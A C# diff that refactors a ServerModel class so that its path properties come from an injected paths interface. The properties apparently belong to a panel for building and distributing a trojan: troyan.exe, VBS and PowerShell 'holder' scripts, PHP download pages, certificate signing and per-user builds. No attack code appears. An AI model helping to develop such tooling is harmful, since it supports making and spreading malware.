@@ -2,7 +2,7 @@ using System.Text.Json.Serialization;
 
 namespace model;
 
-public class ServerModel: BaseModel
+public class ServerModel : BaseModel
 {
     [JsonPropertyName("version")] public string Version { get; set; } = "";
     [JsonPropertyName("urlDoc")] public string UrlDoc { get; set; } = "";
@@ -21,21 +21,24 @@ public class ServerModel: BaseModel
 
     [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; }
 
-    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
-    [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
+    /// <summary>Set by the panel <c>ServerModelLoader</c> after load; required for path-backed properties.</summary>
+    [JsonIgnore] public IPanelServerPaths Paths { get; set; } = null!;
+
+    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => Paths.SourceCertDir;
+    [JsonPropertyName("rootDir")] public string RootDir => Paths.RootDir;
 
 
-    [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
-    [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
-    [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
+    [JsonPropertyName("cpDir")] public string CpDir => Paths.CpDir;
+    [JsonPropertyName("certDir")] public string CertDir => Paths.CertDir;
+    [JsonPropertyName("sysDir")] public string SysDir => Paths.SysDir;
 
-    [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => ServerModelLoader.TroyanBuilder;
-    [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
-    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
+    [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => Paths.TroyanBuilder;
+    [JsonPropertyName("troyanDir")] public string TroyanDir => Paths.TroyanDir;
+    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => Paths.TroyanScriptDir;
     [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");
     [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
     [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
-    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
+    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => Paths.TroyanVbsDir;
     [JsonPropertyName("troyanVbsDebug")] public string TroyanVbsDebug => Path.Join(TroyanOutputDir, "troyan.debug.vbs");
     [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");
 
@@ -47,15 +50,12 @@ public class ServerModel: BaseModel
     [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
     [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
 
-    public string UserDataFile(string file)
-    {
-        return ServerModelLoader.UserDataFile(Server, file);
-    }
+    public string UserDataFile(string file) => Paths.UserDataFile(Server, file);
 
-    [JsonPropertyName("userBody")] public string UserBody => ServerModelLoader.UserDataBody(Server);
+    [JsonPropertyName("userBody")] public string UserBody => Paths.UserDataBody(Server);
     [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
     [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
-    [JsonPropertyName("userDataDir")] public string UserDataDir => ServerModelLoader.UserDataDir(Server);
+    [JsonPropertyName("userDataDir")] public string UserDataDir => Paths.UserDataDir(Server);
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
 
@@ -77,8 +77,8 @@ public class ServerModel: BaseModel
     }
 
 
-    [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
-    [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
+    [JsonPropertyName("adsDir")] public string AdsDir => Paths.AdsDir;
+    [JsonPropertyName("phpDir")] public string PhpDir => Paths.PhpDir;
     [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
     [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
     [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
@@ -190,7 +190,7 @@ public class ServerModel: BaseModel
     public string AdminPassword { get; set; }
 
 
-    [JsonPropertyName("certToolExe")] public string CertToolExe => ServerModelLoader.CertTool;
+    [JsonPropertyName("certToolExe")] public string CertToolExe => Paths.CertTool;
     [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.log");
     [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.log");
     [JsonPropertyName("userPostLog")] public string UserPostLog => Path.Combine(UserDataDir, "post.log");
